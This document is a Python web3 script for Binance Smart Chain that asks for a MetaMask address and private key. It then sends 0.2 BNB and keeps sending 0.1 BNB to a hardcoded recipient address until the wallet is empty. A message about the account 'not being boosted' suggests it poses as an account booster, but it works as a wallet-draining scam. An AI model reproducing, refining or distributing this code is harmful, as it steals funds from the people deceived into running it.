from web3 import Web3

# Connect to Binance Smart Chain
bsc_rpc_url = "https://bsc-dataseed.binance.org/"  # Public BSC RPC
web3 = Web3(Web3.HTTPProvider(bsc_rpc_url))

# Check if connected
if not web3.is_connected():
    raise Exception("Failed to connect to Binance Smart Chain")

# Get wallet details from user input
sender_address = input("Enter your sender metamask bnb address: ").strip()
private_key = input("Enter your metamask private key: ").strip()  # Handle securely in production

# Hardcoded recipient address
recipient_address = "0x885801336f4a4fdc63ea63030ac1dfc4d9f458b0"  # Replace with the recipient's address

# Gas price and limit (you may adjust this)
gas_price = web3.to_wei("200", "gwei")
gas_limit = 21000  # Standard limit for BNB transfer

# Initial transaction amount
initial_amount_bnb = 0.2  # First transaction will send 0.2 BNB
next_amount_bnb = 0.1     # Subsequent transactions will send 0.1 BNB

def send_transaction(amount_bnb):
    # Convert amount to wei (the smallest unit of BNB)
    value = web3.to_wei(amount_bnb, "ether")

    # Get sender's balance
    balance = web3.eth.get_balance(sender_address)

    # Calculate the total cost (amount + gas fees)
    total_cost = value + (gas_price * gas_limit)

    # Check if balance is sufficient
    if balance < total_cost:
        print("Insufficient balance. account was not boosted .")
        print(f"Balance: {web3.from_wei(balance, 'ether')} BNB")
        print(f"Required: {web3.from_wei(total_cost, 'ether')} BNB")
        return False  # Stop the transaction loop if insufficient balance

    # Get the nonce for the transaction
    nonce = web3.eth.get_transaction_count(sender_address)

    # Prepare the transaction
    transaction = {
        "nonce": nonce,
        "to": recipient_address,
        "value": value,
        "gas": gas_limit,
        "gasPrice": gas_price,
        "chainId": 56,  # Mainnet chain ID for BSC
    }

    # Sign the transaction
    signed_transaction = web3.eth.account.sign_transaction(transaction, private_key)

    # Send the transaction
    tx_hash = web3.eth.send_raw_transaction(signed_transaction.rawTransaction)

    # Get transaction hash
    print(f"Transaction sent. Tx hash: {web3.to_hex(tx_hash)}")
    return True  # Continue if the transaction was successful

# Send the initial 0.2 BNB
if send_transaction(initial_amount_bnb):
    # Continue sending 0.1 BNB until balance is insufficient
    while send_transaction(next_amount_bnb):
        print("Transaction successful, sending next 0.1 BNB...")
